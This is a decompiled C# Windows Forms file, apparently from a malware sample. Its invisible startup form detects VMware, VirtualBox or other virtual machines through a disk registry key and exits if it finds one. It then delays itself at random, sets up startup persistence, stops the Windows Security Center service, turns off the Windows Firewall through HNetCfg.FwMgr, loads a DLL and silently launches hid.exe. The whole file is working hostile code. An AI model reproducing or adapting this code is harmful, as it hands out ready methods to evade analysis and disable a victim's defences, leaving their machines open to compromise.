using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using a.My;

namespace a;

[DesignerGenerated]
public class StartForm : Form
{
	private IContainer components;

	public StartForm()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(91, 86);
		((Form)this).set_ClientSize(clientSize);
		((Form)this).set_FormBorderStyle((FormBorderStyle)5);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).ResumeLayout(false);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		try
		{
			if (((ServerComputer)MyProject.Computer).get_Registry().GetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\Disk\\Enum", "0", (object)"").ToString()!.ToLower().Contains("vmware"))
			{
				ProjectData.EndApp();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (((ServerComputer)MyProject.Computer).get_Registry().GetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\Disk\\Enum", "0", (object)"").ToString()!.ToLower().Contains("virtual"))
			{
				ProjectData.EndApp();
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (((ServerComputer)MyProject.Computer).get_Registry().GetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\Disk\\Enum", "0", (object)"").ToString()!.ToLower().Contains("vbox"))
			{
				ProjectData.EndApp();
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		try
		{
			Random random = new Random();
			VBMath.Randomize((double)random.Next());
			if (!Config.Debug)
			{
				Thread.Sleep(checked((int)Math.Round(Conversion.Int(VBMath.Rnd() * 120000f))));
			}
			StartUp.Start();
			if (Config.KillFW)
			{
				try
				{
					try
					{
						Interaction.Shell("cmd.exe /c net stop \"Security Center\"", (AppWinStyle)0, false, -1);
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						ProjectData.ClearProjectError();
					}
					object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("HNetCfg.FwMgr", ""));
					object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(NewLateBinding.LateGet(objectValue, (Type)null, "LocalPolicy", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentProfile", new object[0], (string[])null, (Type[])null, (bool[])null));
					NewLateBinding.LateSet(objectValue2, (Type)null, "FIREWALLENABLED", new object[1] { false }, (string[])null, (Type[])null);
				}
				catch (Exception projectError5)
				{
					ProjectData.SetProjectError(projectError5);
					ProjectData.ClearProjectError();
				}
			}
			LoadDLL.Load();
			try
			{
				Interaction.Shell(Application.get_StartupPath() + "\\hid.exe", (AppWinStyle)0, false, -1);
			}
			catch (Exception projectError6)
			{
				ProjectData.SetProjectError(projectError6);
				ProjectData.ClearProjectError();
			}
			((Control)MyProject.Forms.MainForm).Show();
		}
		catch (Exception projectError7)
		{
			ProjectData.SetProjectError(projectError7);
			ProjectData.EndApp();
			ProjectData.ClearProjectError();
		}
	}
}
